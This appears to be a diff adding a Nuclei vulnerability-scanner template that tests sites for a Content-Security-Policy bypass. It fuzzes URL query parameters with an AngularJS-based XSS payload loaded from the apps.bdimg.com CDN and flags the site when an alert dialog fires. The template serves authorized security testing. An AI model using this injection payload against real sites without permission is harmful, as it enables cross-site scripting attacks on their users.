@@ -1,0 +1,39 @@
+id: bdimg-apps-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via BDImg Apps
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,bdimg-apps
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: bdimg_apps_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "bdimg_apps_csp_xss == true"
+# digest: 4a0a00473045022005addc99f5ebd88cde80f596c40542b20f541e7c2948e544068debb6fab12cea022100f724fae9b2333e944b7d9f4e01caead86a5a6670bdea233686fc6f61a9dde171:922c64590222798bb761d5b6d8e72950
